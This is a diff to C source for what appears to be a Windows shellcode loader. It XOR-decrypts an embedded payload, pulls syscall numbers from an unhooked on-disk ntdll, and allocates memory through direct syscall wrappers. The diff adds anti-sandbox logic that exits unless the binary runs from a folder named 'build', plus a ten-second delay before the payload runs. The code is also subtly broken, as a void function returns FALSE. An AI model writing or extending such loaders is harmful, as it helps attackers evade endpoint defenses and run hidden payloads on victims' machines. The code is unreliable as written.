@@ -1,4 +1,4 @@
-#include <windows.h>
+﻿#include <windows.h>
 #include <winternl.h>
 #include <stdio.h>
 
@@ -15,6 +15,35 @@ void xor_decrypt(unsigned char* data, size_t data_len, const unsigned char* key,
     } 
 }
 
+void dircheck(const wchar_t* targetDir) {
+    wchar_t exePath[MAX_PATH];
+    wchar_t exeDir[MAX_PATH];
+
+    // Get full path to current executable
+    if (!GetModuleFileNameW(NULL, exePath, MAX_PATH))
+        return FALSE;
+
+    // Copy path so we can modify it
+    wcscpy_s(exeDir, MAX_PATH, exePath);
+
+    // Strip filename → exeDir = "...\\parent"
+    wchar_t* lastSlash = wcsrchr(exeDir, L'\\');
+    if (!lastSlash)
+        return FALSE;
+    *lastSlash = L'\0';
+
+    // Find start of parent directory name
+    wchar_t* parentSlash = wcsrchr(exeDir, L'\\');
+    if (!parentSlash)
+        return FALSE;
+
+    // Compare only the directory name
+    BOOL b = _wcsicmp(parentSlash + 1, targetDir) == 0;
+
+    if (b == 0) {
+        exit(-1);
+    }
+}
 DWORD GetSyscallFromDiskClassic(const char* name){
     HMODULE cleanNtDll = LoadLibraryExA(
         "ntdll.dll",
@@ -139,6 +168,8 @@ void h_ntprotectvirtualmemory(void* buf, SIZE_T size, ULONG newprotect, PULONG o
 }
 
 int main(void){
+    dircheck(L"build");
+    Sleep(10000);
     InitSyscalls();
     SIZE_T sc_size = sizeof(sc);
     char* buf = (char*)h_ntallocatevirtualmemory(sc_size, PAGE_READWRITE);
